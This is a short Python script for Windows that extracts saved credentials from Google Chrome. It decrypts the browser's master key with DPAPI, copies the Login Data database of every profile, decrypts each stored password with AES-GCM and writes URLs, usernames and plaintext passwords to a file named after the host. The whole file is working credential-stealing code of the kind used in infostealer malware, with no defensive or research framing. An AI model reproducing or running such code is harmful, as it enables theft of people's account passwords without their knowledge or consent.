import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import socket

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        print(f"Error decrypting password: {e}")
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def save_passwords(output_file):
    key = get_encryption_key()
    user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = ["Default"] + [d for d in os.listdir(user_data_path) if d.startswith("Profile ")]
    
    with open(output_file, "a", encoding="utf-8") as f:
        for profile in profiles:
            profile_path = os.path.join(user_data_path, profile)
            db_path = os.path.join(profile_path, "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            
            try:
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_last_used")
                
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = decrypt_password(row[3], key)
                    if username or password:
                        f.write(f"Origin URL: {origin_url}\n")
                        f.write(f"Action URL: {action_url}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                        f.write("\n")
                
                cursor.close()
                db.close()
            finally:
                try:
                    os.remove(filename)
                except Exception as e:
                    print(f"Error removing temporary database file: {e}")

# Get the hostname of the current machine
hostname = socket.gethostname()

# Create the output filename using the hostname
output_file = f"{hostname}_passwords.txt"
save_passwords(output_file)
print(f"Passwords have been successfully extracted and saved to {output_file}!")
